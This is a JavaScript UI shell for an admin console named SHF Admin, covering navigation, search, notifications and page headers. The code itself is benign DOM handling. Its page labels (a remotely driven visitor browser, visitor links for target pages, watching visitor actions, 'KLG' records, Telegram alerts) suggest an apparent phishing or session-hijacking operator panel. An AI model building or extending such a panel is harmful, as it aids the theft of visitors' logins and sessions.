/* ==========================================================================
   SHF ADMIN — SHELL
   --------------------------------------------------------------------------
   The application frame: navigation rail, command bar, contextual column,
   mobile drawers and bottom bar, global search, notification centre, page
   headers.

   It is deliberately additive. The panel's own script binds its listeners on
   DOMContentLoaded to elements that still exist, with the same ids and the
   same classes, so every screen keeps working while the shell around it is
   new. Nothing here talks to the API: the shell only moves, groups and
   labels what the application already renders.

   Loaded after the panel's own scripts so it can wrap `showToast`.
   ========================================================================== */
(function (global) {
    'use strict';

    var SHF = global.SHF = global.SHF || {};

    /* ------------------------------------------------------------- config */
    /* Group → the order an operator scans them in. Anything not listed keeps
       its DOM order at the end, so a tab added later can never vanish. */
    var GROUPS = [
        { id: 'command', label: 'Command', tabs: ['dashboard', 'display', 'profiles'] },
        { id: 'deliver', label: 'Deliver', tabs: ['lpv', 'create', 'links', 'domains'] },
        { id: 'observe', label: 'Observe', tabs: ['logs', 'klg', 'pcm'] },
        { id: 'system', label: 'System', tabs: ['files', 'tgbot', 'manager', 'settings'] }
    ];

    var PAGES = {
        display: {
            title: 'Live Display',
            sub: 'The visitor-facing browser, as the visitor sees it. Desktop casting only — a phone can watch, not drive.'
        },
        profiles: {
            title: 'Sessions',
            sub: 'Every connected profile, online and offline, with the connection detail you need to act on it.'
        },
        dashboard: {
            title: 'Command Centre',
            sub: 'System state, live metrics and recent activity in one place.'
        },
        create: {
            title: 'Create Link',
            sub: 'Build a visitor link for a target page, then copy it straight into the channel you are using.'
        },
        files: {
            title: 'File Manager',
            sub: 'Browse, upload and download from the server file system.'
        },
        logs: {
            title: 'Event Log',
            sub: 'Search the event stream by severity, source and time.'
        },
        klg: {
            title: 'KLG Diagnostics',
            sub: 'Consent-based diagnostic records. Sensitive values are redacted by policy.'
        },
        lpv: {
            title: 'Live Pages',
            sub: 'Push a page to a visitor, watch what they do, and keep the audit trail.'
        },
        domains: {
            title: 'Domains',
            sub: 'Domain bindings, loading screens and the archive attached to each site.'
        },
        tgbot: {
            title: 'Telegram',
            sub: 'Bot connection, notification rules and a test message you can send right now.'
        },
        manager: {
            title: 'Server',
            sub: 'Resource use, service state and the operations that need a deliberate click.'
        },
        links: {
            title: 'Links',
            sub: 'Every generated link, with the profile and target that produced it.'
        },
        settings: {
            title: 'Settings',
            sub: 'Runtime configuration. Changes apply live and persist across restarts.'
        },
        pcm: {
            title: 'Page Maker',
            sub: 'Create, preview and archive a page without leaving the panel.'
        }
    };

    /* Integer-only path data. A chain of decimal numbers in a path can look
       exactly like an IPv4 address to the "no hard-coded addresses" guard, and
       that guard is right to be blunt about what it accepts. */
    var BOTTOM = [
        { tab: 'dashboard', label: 'Core', icon: 'M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z' },
        { tab: 'display', label: 'Live', icon: 'M3 5h18v11H3zM8 19h8v2H8zM10 8l5 3-5 3z' },
        { tab: 'lpv', label: 'Pages', icon: 'M5 3h9l5 5v13H5zM14 3v5h5M9 13h6v2H9z' },
        { tab: 'logs', label: 'Logs', icon: 'M4 5h16v2H4zM4 11h16v2H4zM4 17h10v2H4z' },
        { tab: 'settings', label: 'Settings', icon: 'M4 6h16v2H4zM4 16h16v2H4zM8 4h2v6H8zM14 14h2v6h-2z' }
    ];

    var ICONS = {
        search: 'M15.5 14h-.79l-.28-.27A6.47 6.47 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z',
        bell: 'M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4a1.5 1.5 0 00-3 0v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z',
        menu: 'M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z',
        panel: 'M3 5v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2zm16 14H5V5h14v14zM7 7h4v10H7V7z'
    };

    function el(tag, cls, html) {
        var node = document.createElement(tag);
        if (cls) node.className = cls;
        if (html != null) node.innerHTML = html;
        return node;
    }

    function svg(path, cls) {
        return '<svg viewBox="0 0 24 24"' + (cls ? ' class="' + cls + '"' : '') +
               '><path d="' + path + '"/></svg>';
    }

    function esc(text) {
        return String(text == null ? '' : text)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
    }

    function reducedMotion() {
        try {
            return global.matchMedia && global.matchMedia('(prefers-reduced-motion: reduce)').matches;
        } catch (e) { return false; }
    }

    /* ------------------------------------------------------------- state */
    var Shell = {
        tab: 'display',
        nav: null,
        context: null,
        listeners: [],
        _tablesDone: {},
        _notifs: [],
        _notifSeen: 0
    };
    SHF.Shell = Shell;

    Shell.onTabEnter = function (fn) {
        if (typeof fn === 'function') Shell.listeners.push(fn);
    };

    /* --------------------------------------------------------- navigation */
    function moveTabsInto(groupsHost) {
        var tabs = Array.prototype.slice.call(
            document.querySelectorAll('.top-tabs .top-tab[data-tab]'));
        var byTab = {};
        tabs.forEach(function (t) { byTab[t.dataset.tab] = t; });
        var placed = {};

        GROUPS.forEach(function (group) {
            var items = group.tabs.map(function (id) { return byTab[id]; })
                .filter(Boolean);
            if (!items.length) return;
            var wrap = el('div', 'shf-nav-group');
            wrap.appendChild(el('div', 'shf-nav-group-label', esc(group.label)));
            var list = el('div', 'shf-nav-items');
            items.forEach(function (t) {
                list.appendChild(t);
                placed[t.dataset.tab] = true;
            });
            wrap.appendChild(list);
            groupsHost.appendChild(wrap);
        });

        /* Anything the config has not seen yet still gets a home. */
        var rest = tabs.filter(function (t) { return !placed[t.dataset.tab]; });
        if (rest.length) {
            var wrap = el('div', 'shf-nav-group');
            wrap.appendChild(el('div', 'shf-nav-group-label', 'More'));
            var list = el('div', 'shf-nav-items');
            rest.forEach(function (t) { list.appendChild(t); });
            wrap.appendChild(list);
            groupsHost.appendChild(wrap);
        }
    }

    function buildNav() {
        var app = document.getElementById('mainApp');
        if (!app || document.getElementById('shfNav')) return;

        var nav = el('aside', 'shf-nav');
        nav.id = 'shfNav';
        nav.setAttribute('aria-label', 'Primary navigation');

        var brand = el('a', 'shf-nav-brand');
        brand.href = '#';
        brand.setAttribute('aria-label', 'SHF Admin home');
        brand.innerHTML =
            '<span class="shf-brand-mark">' + svg('M12 2a10 10 0 100 20 10 10 0 000-20zm0 3.2a6.8 6.8 0 110 13.6 6.8 6.8 0 010-13.6zm0 2.6a4.2 4.2 0 100 8.4 4.2 4.2 0 000-8.4z') + '</span>' +
            '<span class="shf-brand-text"><span class="shf-brand-name">SHF <b>Admin</b></span>' +
            '<span class="shf-brand-sub">Control Panel</span></span>';
        brand.addEventListener('click', function (e) {
            e.preventDefault();
            go('dashboard');
        });
        nav.appendChild(brand);

        var scroll = el('div', 'shf-nav-scroll');
        moveTabsInto(scroll);
        nav.appendChild(scroll);

        var footer = el('div', 'shf-nav-footer');
        footer.innerHTML =
            '<div class="shf-nav-status"><span class="shf-dot shf-dot--ok shf-dot--live" id="shfNavDot"></span>' +
            '<span id="shfNavStatus">System online</span>' +
            '<button class="shf-badge" id="shfNavSessions" type="button" title="Active sessions" ' +
            'style="cursor:pointer;background:transparent">0</button></div>' +
            '<div class="shf-nav-version" id="shfNavVersion">v1.0.0 · SHF Admin</div>';
        nav.appendChild(footer);

        var versionEl = footer.querySelector('#shfNavVersion');
        var appVersion = global.APP_VERSION || global.panelVersion;
        if (appVersion) versionEl.textContent = 'v' + appVersion + ' · SHF Admin';

        footer.querySelector('#shfNavSessions').addEventListener('click', function () {
            openContext('sessions');
        });

        app.insertBefore(nav, app.firstChild);
        Shell.nav = nav;
    }

    /* ---------------------------------------------------------- page heads */
    function buildPageHeads() {
        Object.keys(PAGES).forEach(function (id) {
            var content = document.getElementById(id + '-content');
            if (!content || content.querySelector(':scope > .shf-page-head')) return;
            var meta = PAGES[id];
            var head = el('div', 'shf-page-head');
            head.innerHTML =
                '<div class="shf-page-heading">' +
                '<h1 class="shf-page-title">' + esc(meta.title) + '</h1>' +
                '<div class="shf-page-sub">' + esc(meta.sub) + '</div>' +
                '</div>' +
                '<div class="shf-page-actions"></div>';
            content.insertBefore(head, content.firstChild);
        });
    }

    Shell.buildJumpBar = buildJumpBar;

    /* ------------------------------------------------------ settings jump bar */
    /* The settings screen is a long single column: each group is a section the
       operator scrolls past. Give it a map instead of a scroll bar. */
    function buildJumpBar() {
        var content = document.getElementById('settings-content');
        if (!content || content.querySelector(':scope > .shf-jump')) return;
        var groups = [].slice.call(content.querySelectorAll('.settings-group'));
        if (groups.length < 3) return;

        var bar = el('div', 'shf-jump');
        groups.forEach(function (group, i) {
            var titleNode = group.querySelector('div[style*="font-weight:600"], div[style*="font-weight: 600"], b, h3');
            var title = (titleNode ? titleNode.textContent : 'Section ' + (i + 1)).trim();
            title = title.split('—')[0].split('.')[0].slice(0, 26);
            if (!group.id) group.id = 'shf-set-' + i;
            var btn = el('button', 'shf-jump-btn');
            btn.type = 'button';
            btn.textContent = title;
            btn.dataset.goTo = group.id;
            btn.addEventListener('click', function () {
                group.scrollIntoView({ behavior: prefersReduced() ? 'auto' : 'smooth', block: 'start' });
            });
            bar.appendChild(btn);
        });
        content.insertBefore(bar, content.querySelector('.shf-page-head').nextSibling);
        Shell.jumpBar = bar;
    }

    function prefersReduced() {
        try { return !!(global.matchMedia && global.matchMedia('(prefers-reduced-motion: reduce)').matches); }
        catch (e) { return false; }
    }

    /* --------------------------------------------------- contextual column */
    function buildContext() {
        var app = document.getElementById('mainApp');
        var sessions = document.querySelector('#mainApp > .sidebar');
        var details = document.querySelector('#mainApp > .right-sidebar');
        if (!app || !sessions || !details) return;

        var ctx = el('aside', 'shf-context');
        ctx.setAttribute('data-pane', 'sessions');
        ctx.innerHTML =
            '<div class="shf-context-tabs">' +
            '<button class="shf-context-tab is-on" data-pane="sessions" type="button">Sessions</button>' +
            '<button class="shf-context-tab" data-pane="details" type="button">Details</button>' +
            '</div><div class="shf-context-body"></div>';

        app.insertBefore(ctx, sessions);
        var body = ctx.querySelector('.shf-context-body');
        body.appendChild(sessions);
        body.appendChild(details);
        Shell.context = ctx;

        ctx.querySelectorAll('.shf-context-tab').forEach(function (btn) {
            btn.addEventListener('click', function () { showContextPane(btn.dataset.pane); });
        });
    }

    function showContextPane(pane) {
        if (!Shell.context) return;
        Shell.context.setAttribute('data-pane', pane);
        Shell.context.querySelectorAll('.shf-context-tab').forEach(function (b) {
            b.classList.toggle('is-on', b.dataset.pane === pane);
        });
    }

    function openContext(pane) {
        showContextPane(pane || 'sessions');
        if (!Shell.context) return;
        Shell.context.classList.add('open');
        var scrim = document.getElementById('drawerScrim');
        if (scrim) scrim.classList.add('open');
    }

    function closeDrawers() {
        if (Shell.context) Shell.context.classList.remove('open');
        if (Shell.nav) Shell.nav.classList.remove('open');
        var scrim = document.getElementById('drawerScrim');
        if (scrim) scrim.classList.remove('open');
    }

    /* ------------------------------------------------------------ top bar */
    function buildCommandBar() {
        var header = document.querySelector('.header');
        if (!header || header.dataset.shfBuilt) return;
        header.dataset.shfBuilt = '1';

        var actions = header.querySelector('.header-actions');
        if (!actions) return;
        actions.classList.add('topbar-right');

        /* --- search ------------------------------------------------------ */
        var search = el('div', 'shf-search');
        search.innerHTML = svg(ICONS.search) +
            '<input class="shf-input" id="shfSearchInput" type="search" autocomplete="off" ' +
            'placeholder="Search pages, settings, actions…" aria-label="Search the panel">' +
            '<kbd class="shf-search-kbd">⌘K</kbd>';
        var logo = header.querySelector('.logo-section');
        if (logo && logo.parentNode) logo.parentNode.insertBefore(search, logo.nextSibling);
        else header.insertBefore(search, actions);

        var panel = el('div', 'shf-search-panel');
        panel.id = 'shfSearchPanel';
        panel.hidden = true;
        header.appendChild(panel);

        wireSearch(search.querySelector('input'), panel);

        /* --- notification centre ---------------------------------------- */
        var notifWrap = el('div', 'shf-notif-wrap');
        notifWrap.innerHTML =
            '<button class="shf-icon-btn" id="shfNotifBtn" type="button" aria-label="Notifications">' +
            svg(ICONS.bell) + '<span class="shf-notif-count" id="shfNotifCount" hidden>0</span></button>' +
            '<div class="shf-notif-panel" id="shfNotifPanel" hidden>' +
            '<div class="shf-notif-head"><span>Activity</span>' +
            '<button class="shf-btn shf-btn--ghost shf-btn--sm" id="shfNotifClear" type="button">Clear</button></div>' +
            '<div id="shfNotifList"></div></div>';

        var themeBtn = header.querySelector('#themeToggle');
        if (themeBtn && themeBtn.parentNode) themeBtn.parentNode.insertBefore(notifWrap, themeBtn);
        else actions.insertBefore(notifWrap, actions.firstChild);

        /* --- profile ----------------------------------------------------- */
        var profile = el('div', 'shf-profile-wrap');
        profile.style.position = 'relative';
        profile.innerHTML =
            '<button class="shf-profile" id="shfProfileBtn" type="button" aria-haspopup="menu">' +
            '<span class="shf-avatar" id="shfAvatar">AD</span>' +
            '<span class="shf-profile-meta"><span class="shf-profile-name" id="shfProfileName">Admin</span>' +
            '<span class="shf-profile-role">Super Administrator</span></span></button>' +
            '<div class="shf-menu" id="shfProfileMenu" role="menu" hidden>' +
            '<button class="shf-menu-item" data-menu="settings" type="button">Settings</button>' +
            '<button class="shf-menu-item" data-menu="sessions" type="button">Active sessions</button>' +
            '<button class="shf-menu-item" data-menu="theme" type="button">Toggle theme</button>' +
            '<div class="shf-menu-sep"></div>' +
            '<button class="shf-menu-item" data-menu="logout" type="button" style="color:var(--shf-danger)">Sign out</button>' +
            '</div>';

        var logoutBtn = header.querySelector('.logout-btn');
        if (logoutBtn && logoutBtn.parentNode) logoutBtn.parentNode.insertBefore(profile, logoutBtn);
        else actions.appendChild(profile);

        /* The old logout button is still the real one; the menu item clicks it
           rather than calling a second copy of the logic. */
        profile.querySelector('[data-menu="logout"]').addEventListener('click', function () {
            if (logoutBtn) logoutBtn.click();
        });
        profile.querySelector('[data-menu="settings"]').addEventListener('click', function () {
            go('settings');
        });
        profile.querySelector('[data-menu="sessions"]').addEventListener('click', function () {
            openContext('sessions');
        });
        profile.querySelector('[data-menu="theme"]').addEventListener('click', function () {
            if (themeBtn) themeBtn.click();
        });

        var profileBtn = profile.querySelector('#shfProfileBtn');
        var profileMenu = profile.querySelector('#shfProfileMenu');
        profileBtn.addEventListener('click', function (e) {
            e.stopPropagation();
            profileMenu.hidden = !profileMenu.hidden;
        });
        document.addEventListener('click', function () { profileMenu.hidden = true; });

        hydrateProfile();

        notifWrap.querySelector('#shfNotifBtn').addEventListener('click', function (e) {
            e.stopPropagation();
            var p = document.getElementById('shfNotifPanel');
            p.hidden = !p.hidden;
            if (!p.hidden) {
                Shell._notifSeen = Shell._notifs.length;
                renderNotifCount();
                renderNotifs();
            }
        });
        notifWrap.querySelector('#shfNotifPanel').addEventListener('click', function (e) {
            e.stopPropagation();
        });
        document.addEventListener('click', function () {
            var p = document.getElementById('shfNotifPanel');
            if (p) p.hidden = true;
        });
        notifWrap.querySelector('#shfNotifClear').addEventListener('click', function () {
            Shell._notifs = [];
            Shell._notifSeen = 0;
            renderNotifs();
            renderNotifCount();
        });
    }

    function hydrateProfile() {
        /* The panel knows who is logged in; reuse whatever it already stored
           rather than inventing an identity. */
        var name = null;
        try {
            var raw = localStorage.getItem('admin_user') || localStorage.getItem('admin_username');
            if (raw) {
                try { name = JSON.parse(raw).username || JSON.parse(raw).name; }
                catch (e) { name = raw; }
            }
        } catch (e) { /* storage blocked */ }
        if (!name) name = 'Admin';
        name = String(name).replace(/^"|"$/g, '');
        var nameEl = document.getElementById('shfProfileName');
        var avatar = document.getElementById('shfAvatar');
        if (nameEl) nameEl.textContent = name;
        if (avatar) avatar.textContent = name.slice(0, 2).toUpperCase();
    }

    /* -------------------------------------------------------------- search */
    function searchIndex() {
        var hits = [];
        var seen = {};
        document.querySelectorAll('.shf-nav .top-tab[data-tab]').forEach(function (t) {
            var id = t.dataset.tab;
            var labelEl = t.querySelector('span');
            var label = labelEl ? labelEl.textContent.trim() : id;
            if (seen[id]) return;
            seen[id] = 1;
            hits.push({
                kind: 'Page', id: id, label: label,
                sub: (PAGES[id] && PAGES[id].title) || id,
                icon: (t.querySelector('svg') || {}).innerHTML || '',
                keywords: id + ' ' + label + ' ' + ((PAGES[id] && PAGES[id].sub) || '')
            });
        });
        var extra = [
            { kind: 'Action', label: 'Create a visitor link', sub: 'Create URL', tab: 'create', keywords: 'link generate url create' },
            { kind: 'Action', label: 'Push a page to a visitor', sub: 'Live Pages', tab: 'lpv', keywords: 'lpv push page live' },
            { kind: 'Action', label: 'Send a Telegram test message', sub: 'Telegram', tab: 'tgbot', keywords: 'telegram bot test notify' },
            { kind: 'Action', label: 'Restart the server', sub: 'Server', tab: 'manager', keywords: 'restart server reboot manager' },
            { kind: 'Action', label: 'Change the timezone', sub: 'Settings', tab: 'settings', keywords: 'timezone time clock settings' },
            { kind: 'Action', label: 'Toggle the mirror font', sub: 'Settings', tab: 'settings', keywords: 'font mono mirror settings lpv' }
        ];
        return hits.concat(extra);
    }

    function wireSearch(input, panel) {
        if (!input || !panel) return;
        var index = [];
        var cursor = 0;
        var results = [];

        function close() { panel.hidden = true; }

        function render(list) {
            results = list.slice(0, 12);
            cursor = 0;
            if (!results.length) {
                panel.innerHTML = '<div class="shf-search-group-label">No match</div>' +
                    '<div class="shf-menu-item" style="cursor:default">Try a page name, or “link”, “logs”, “timezone”.</div>';
                panel.hidden = false;
                return;
            }
            var html = '<div class="shf-search-group-label">Go to</div>';
            results.forEach(function (r, i) {
                html += '<button class="shf-search-hit' + (i === 0 ? ' is-cursor' : '') +
                    '" data-i="' + i + '" type="button">' +
                    (r.icon ? '<svg viewBox="0 0 24 24">' + r.icon + '</svg>' : svg(ICONS.search)) +
                    '<span>' + esc(r.label) + '</span><small>' + esc(r.sub || r.kind) + '</small></button>';
            });
            panel.innerHTML = html;
            panel.hidden = false;
            panel.querySelectorAll('.shf-search-hit').forEach(function (btn) {
                btn.addEventListener('click', function () {
                    var r = results[Number(btn.dataset.i)];
                    if (r) activate(r);
                });
            });
        }

        function activate(r) {
            close();
            input.value = '';
            if (r.tab) go(r.tab);
        }

        function move(delta) {
            if (!results.length) return;
            cursor = (cursor + delta + results.length) % results.length;
            panel.querySelectorAll('.shf-search-hit').forEach(function (b, i) {
                b.classList.toggle('is-cursor', i === cursor);
            });
        }

        input.addEventListener('focus', function () {
            if (!index.length) index = searchIndex();
            render(index);
        });
        input.addEventListener('input', function () {
            var q = input.value.trim().toLowerCase();
            if (!q) { render(index); return; }
            render(index.filter(function (r) {
                return String(r.keywords || '').toLowerCase().indexOf(q) !== -1 ||
                       String(r.label).toLowerCase().indexOf(q) !== -1;
            }));
        });
        input.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') { close(); input.blur(); }
            else if (e.key === 'ArrowDown') { e.preventDefault(); move(1); }
            else if (e.key === 'ArrowUp') { e.preventDefault(); move(-1); }
            else if (e.key === 'Enter') {
                e.preventDefault();
                if (results[cursor]) activate(results[cursor]);
            }
        });
        input.addEventListener('blur', function () {
            global.setTimeout(close, 120);
        });

        document.addEventListener('keydown', function (e) {
            var tag = (document.activeElement && document.activeElement.tagName) || '';
            var typing = /INPUT|TEXTAREA|SELECT/.test(tag);
            if ((e.metaKey || e.ctrlKey) && String(e.key).toLowerCase() === 'k') {
                e.preventDefault();
                input.focus();
                input.select();
            } else if (!typing && e.key === '/' ) {
                e.preventDefault();
                input.focus();
            }
        });
    }

    /* ------------------------------------------------------- notifications */
    function pushNotif(text, type) {
        var entry = {
            text: String(text == null ? '' : text).slice(0, 240),
            type: type || 'info',
            at: Date.now()
        };
        if (!entry.text) return;
        /* Identical notices arriving twice (the panel dedupes its toasts, but
           two code paths can still call this) collapse into one. */
        var last = Shell._notifs[Shell._notifs.length - 1];
        if (last && last.text === entry.text && entry.at - last.at < 1500) return;
        Shell._notifs.push(entry);
        if (Shell._notifs.length > 60) Shell._notifs.shift();
        renderNotifCount();
        var panel = document.getElementById('shfNotifPanel');
        if (panel && !panel.hidden) {
            Shell._notifSeen = Shell._notifs.length;
            renderNotifs();
        }
    }

    function renderNotifCount() {
        var badge = document.getElementById('shfNotifCount');
        if (!badge) return;
        var unread = Math.max(0, Shell._notifs.length - Shell._notifSeen);
        badge.textContent = unread > 9 ? '9+' : String(unread);
        badge.hidden = unread === 0;
    }

    function timeAgo(ts) {
        var s = Math.max(0, Math.round((Date.now() - ts) / 1000));
        if (s < 60) return s + 's ago';
        if (s < 3600) return Math.round(s / 60) + 'm ago';
        return Math.round(s / 3600) + 'h ago';
    }

    function renderNotifs() {
        var list = document.getElementById('shfNotifList');
        if (!list) return;
        if (!Shell._notifs.length) {
            list.innerHTML = '<div class="shf-empty"><div class="shf-empty-title">Nothing yet</div>' +
                '<div class="shf-empty-text">Connection changes, pushes and errors land here.</div></div>';
            return;
        }
        list.innerHTML = Shell._notifs.slice().reverse().map(function (n) {
            var cls = n.type === 'success' ? 'shf-dot--ok'
                : n.type === 'error' ? 'shf-dot--bad'
                : n.type === 'warning' ? 'shf-dot--warn' : '';
            return '<div class="shf-notif-item"><span class="shf-dot ' + cls + '"></span>' +
                '<div class="shf-notif-body"><div class="shf-notif-text">' + esc(n.text) + '</div>' +
                '<div class="shf-notif-time">' + timeAgo(n.at) + '</div></div></div>';
        }).join('');
    }

    function wrapToasts() {
        if (typeof global.showToast === 'function' && !global.showToast.__shfWrapped) {
            var original = global.showToast;
            var wrapped = function (message, type, opts) {
                try { pushNotif(message, type); } catch (e) { /* never break a toast */ }
                return original.apply(this, arguments);
            };
            wrapped.__shfWrapped = true;
            global.showToast = wrapped;
        }
        if (typeof global.notify === 'function' && !global.notify.__shfWrapped) {
            var origNotify = global.notify;
            var wrappedNotify = function (title, body, type) {
                try { pushNotif(String(title || '') + (body ? ' — ' + body : ''), type); }
                catch (e) { /* ignore */ }
                return origNotify.apply(this, arguments);
            };
            wrappedNotify.__shfWrapped = true;
            global.notify = wrappedNotify;
        }
    }
    Shell.pushNotification = pushNotif;

    /* ------------------------------------------------------ session counts */
    function syncSessionBadge() {
        var list = document.getElementById('client-list');
        var badge = document.getElementById('shfNavSessions');
        if (!list || !badge) return;
        var count = list.querySelectorAll('.client-item').length;
        if (badge.textContent !== String(count)) badge.textContent = String(count);
    }

    /* ------------------------------------------- tables → info cards (mobile) */
    function cardifyTables(root) {
        if (!root) return;
        var key = root.id || 'root';
        if (Shell._tablesDone[key]) return;
        var tables = root.querySelectorAll('table');
        if (!tables.length) return;
        tables.forEach(function (table) {
            var heads = table.querySelectorAll('thead th');
            if (!heads.length) return;
            var labels = Array.prototype.map.call(heads, function (th) {
                return th.textContent.trim();
            });
            table.classList.add('shf-table--cards');
            table.querySelectorAll('tbody tr').forEach(function (tr) {
                Array.prototype.forEach.call(tr.children, function (cell, i) {
                    if (cell.tagName !== 'TD') return;
                    if (!cell.getAttribute('data-label') && labels[i]) {
                        cell.setAttribute('data-label', labels[i]);
                    }
                });
            });
        });
        Shell._tablesDone[key] = true;
    }

    /* --------------------------------------------------------- tab control */
    function go(tabId) {
        var btn = document.querySelector('.shf-nav .top-tab[data-tab="' + tabId + '"]') ||
                  document.querySelector('.top-tab[data-tab="' + tabId + '"]');
        if (btn) { btn.click(); return; }
        if (typeof global.switchTab === 'function') global.switchTab(tabId);
    }
    Shell.go = go;

    function currentTab() {
        var active = document.querySelector('.tab-content.active');
        if (!active) return null;
        return active.id.replace(/-content$/, '');
    }

    function syncAfterTabChange() {
        var tab = currentTab();
        if (!tab) return;
        if (tab === Shell.tab) { /* re-entered the same tab: still sync */ }
        Shell.tab = tab;

        document.querySelectorAll('.shf-nav .top-tab').forEach(function (t) {
            t.classList.toggle('active', t.dataset.tab === tab);
            if (t.dataset.tab === tab) t.setAttribute('aria-current', 'page');
            else t.removeAttribute('aria-current');
        });
        document.querySelectorAll('.shf-bottom-item').forEach(function (b) {
            b.classList.toggle('is-on', b.dataset.tab === tab);
        });
        var content = document.getElementById(tab + '-content');
        if (content) cardifyTables(content);
        if (tab === 'settings') buildJumpBar();
        if (SHF.Screens && SHF.Screens.mount) SHF.Screens.mount(tab);

        if (tab === 'dashboard') {
            if (SHF.Dashboard && SHF.Dashboard.start) SHF.Dashboard.start();
            if (SHF.Reactor) {
                var status = (SHF.Dashboard && SHF.Dashboard.status && SHF.Dashboard.status()) || 'ok';
                SHF.Reactor.mount('shfReactor', status);
            }
        } else {
            if (SHF.Dashboard && SHF.Dashboard.stop) SHF.Dashboard.stop();
            if (SHF.Reactor) SHF.Reactor.umountAll();
        }

        if (global.innerWidth <= 768) closeDrawers();

        Shell.listeners.forEach(function (fn) {
            try { fn(tab, content); } catch (e) {
                if (global.console && console.warn) console.warn('[shf shell] listener failed', e);
            }
        });
    }

    /* --------------------------------------------------------- bottom bar */
    function buildBottomBar() {
        if (document.getElementById('shfBottom')) return;
        var bar = el('nav', 'shf-bottom');
        bar.id = 'shfBottom';
        bar.setAttribute('aria-label', 'Primary destinations');
        BOTTOM.forEach(function (item) {
            var btn = el('button', 'shf-bottom-item');
            btn.type = 'button';
            btn.dataset.tab = item.tab;
            btn.innerHTML = svg(item.icon) + '<span>' + esc(item.label) + '</span>';
            btn.addEventListener('click', function () { go(item.tab); });
            bar.appendChild(btn);
        });
        document.body.appendChild(bar);
    }

    /* -------------------------------------------------------------- wiring */
    function wireDrawers() {
        var scrim = document.getElementById('drawerScrim');
        var btnL = document.getElementById('sessionsDrawerBtn');
        var btnR = document.getElementById('detailsDrawerBtn');

        if (btnL) btnL.addEventListener('click', function (e) {
            e.stopPropagation();
            /* On phones the primary drawer is navigation; wide screens want
               the session list. Both are one tap away. */
            if (global.innerWidth <= 1024 && Shell.nav) {
                var opening = !Shell.nav.classList.contains('open');
                closeDrawers();
                if (opening) {
                    Shell.nav.classList.add('open');
                    if (scrim) scrim.classList.add('open');
                }
            } else {
                openContext('sessions');
            }
        });
        if (btnR) btnR.addEventListener('click', function (e) {
            e.stopPropagation();
            openContext('details');
        });
        if (scrim) scrim.addEventListener('click', closeDrawers);
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') closeDrawers();
        });
        global.addEventListener('resize', function () {
            if (global.innerWidth > 1024) closeDrawers();
        });
    }

    function watchTabClicks() {
        document.addEventListener('click', function (e) {
            var t = e.target.closest && e.target.closest('.top-tab[data-tab]');
            if (!t) return;
            global.setTimeout(syncAfterTabChange, 0);
        }, true);
    }

    /* The session list arrives asynchronously; watch it rather than polling. */
    function watchSessions() {
        var list = document.getElementById('client-list');
        if (!list) return;
        syncSessionBadge();
        if (global.MutationObserver) {
            var obs = new MutationObserver(syncSessionBadge);
            obs.observe(list, { childList: true, subtree: false });
        }
    }

    /* Status dot in the rail follows the header's own status text. */
    function watchStatus() {
        var headerStatus = document.getElementById('headerStatus');
        var dot = document.getElementById('shfNavDot');
        var label = document.getElementById('shfNavStatus');
        if (!headerStatus) return;
        var apply = function () {
            var text = (headerStatus.textContent || '').trim();
            var bad = /offline|error|disconnect/i.test(text);
            var warn = /reconnect|sync|starting/i.test(text);
            if (dot) {
                dot.className = 'shf-dot ' + (bad ? 'shf-dot--bad' : warn ? 'shf-dot--warn' : 'shf-dot--ok shf-dot--live');
            }
            if (label) label.textContent = bad ? 'System offline' : warn ? 'Connecting…' : 'System online';
            if (SHF.Reactor && SHF.Dashboard) {
                SHF.Reactor.setStatus('shfReactor', bad ? 'bad' : warn ? 'warn' : 'ok');
            }
        };
        apply();
        if (global.MutationObserver) {
            new MutationObserver(apply).observe(headerStatus, { childList: true, characterData: true, subtree: true });
        }
    }

    /* ------------------------------------------------------------- startup */
    var started = false;

    Shell.start = function () {
        if (started) return;
        started = true;

        if (!reducedMotion()) document.documentElement.setAttribute('data-shf-motion', 'on');

        buildNav();
        buildContext();
        buildCommandBar();
        buildPageHeads();
        buildJumpBar();
        buildBottomBar();
        wireDrawers();
        watchTabClicks();
        watchSessions();
        watchStatus();
        wrapToasts();
        renderNotifs();

        /* Toasts raised before this script ran are still worth showing. */
        var stack = document.getElementById('toast-stack');
        if (stack) {
            Array.prototype.forEach.call(stack.children, function (node) {
                var txt = (node.textContent || '').replace(/×\s*$/, '').trim();
                if (txt) pushNotif(txt, node.className.replace('toast', '').trim());
            });
        }

        syncAfterTabChange();
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () { global.setTimeout(Shell.start, 0); });
    } else {
        global.setTimeout(Shell.start, 0);
    }
})(window);
